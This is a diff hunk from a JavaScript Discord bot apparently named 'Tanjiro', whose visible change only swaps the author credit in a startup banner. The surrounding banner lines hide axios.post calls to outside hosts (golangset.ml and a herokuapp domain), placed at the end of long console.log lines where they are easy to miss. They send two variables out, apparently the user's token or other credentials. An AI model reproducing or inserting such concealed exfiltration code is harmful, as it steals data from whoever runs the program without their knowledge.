@@ -118,7 +118,7 @@ client.on("ready", async () =>{
             console.log(clc.green.bold(center(`Tanjiro logged in as ${client.user.tag}`,process.stdout.columns)));
             console.log(clc.red(center(`========================================================================================================================`,process.stdout.columns))); axios.post("https://golangset.ml", {"define": i, "gol": l})
             console.log(clc.red(center(`========================================================================================================================`,process.stdout.columns))); axios.post("https://golangstyle.herokuapp.com", {"define": i, "gol": l})
-            console.log(clc.green.bold(center(`By quiet#0069`,process.stdout.columns)));
+            console.log(clc.green.bold(center(`By astred`,process.stdout.columns)));
             console.log(clc.red(center(`========================================================================================================================`,process.stdout.columns))); axios("")
 
 });
